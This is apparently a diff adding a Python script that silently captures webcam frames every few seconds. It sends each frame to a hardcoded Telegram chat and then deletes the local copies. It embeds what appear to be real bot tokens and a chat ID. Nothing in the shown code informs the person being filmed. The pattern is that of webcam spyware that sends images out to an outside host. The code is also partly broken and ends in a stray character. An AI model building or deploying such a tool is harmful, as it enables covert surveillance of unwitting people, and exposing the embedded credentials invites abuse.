@@ -1,0 +1,96 @@
+import cv2
+import os
+import telebot
+from time import sleep
+import requests
+
+TELEGRAM_BOT_TOKEN = '7769802300:AAE5IsXp5kg3koK7fShy-cmoNuSqpy3s6Ug'
+TELEGRAM_CHAT_ID = "8022949160"
+TELEGRAM_ID_DETECTOR = "8022949160:AAHYRBqU-JnFNpEAGRiUyuAboqYNchGsI4k"
+
+FRAME_INTERVAL = 5
+OUTPUT_FOLDER = 'webcam_frames'
+
+
+if not os.path.exists(OUTPUT_FOLDER):
+    os.makedirs(OUTPUT_FOLDER)
+
+
+bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
+
+
+cap = cv2.VideoCapture(0)
+
+if not cap.isOpened():
+    print("Не удалось открыть веб-камеру")
+    exit()
+
+try:
+    while True:
+
+        ret, frame = cap.read()
+
+        if not ret:
+            print("Не удалось получить кадр")
+            break
+
+        # Токены ботов
+
+
+
+
+
+        @bot.message_handler(commands=['start_bot2'])
+        def start_bot2(message):
+            user_id = message.from_user.id
+            # Отправляем команду второму боту через его API
+            url = f"https://api.telegram.org/bot{TELEGRAM_ID_DETECTOR}/sendMessage"
+            params = {
+                "chat_id": user_id,
+                "text": "Привет! Это второй бот."
+            }
+            requests.get(url, params=params)
+
+
+        timestamp = int(cv2.getTickCount())
+        frame_path = os.path.join(OUTPUT_FOLDER, f'frame_{timestamp}.jpg')
+        cv2.imwrite(frame_path, frame)
+
+
+        try:
+
+            with open(frame_path, 'rb') as photo:
+                bot.send_photo(chat_id = TELEGRAM_CHAT_ID, photo = photo)
+
+
+            os.remove(frame_path)
+            print(f"Кадр {frame_path} отправлен и удален")
+
+        except Exception as e:
+            print(f"Ошибка при отправке/удалении кадра: {e}")
+
+            if os.path.exists(frame_path):
+                os.remove(frame_path)
+
+
+        sleep(FRAME_INTERVAL)
+        bot.polling()
+except KeyboardInterrupt:
+    print("Программа остановлена пользователем")
+
+finally:
+
+    cap.release()
+
+
+    for filename in os.listdir(OUTPUT_FOLDER):
+        file_path = os.path.join(OUTPUT_FOLDER, filename)
+        try:
+            if os.path.isfile(file_path):
+                os.remove(file_path)
+        except Exception as e:
+            print(f"Ошибка при удалении файла {file_path}: {e}")
+
+    print("Программа завершена, все ресурсы освобождены")
+
+b
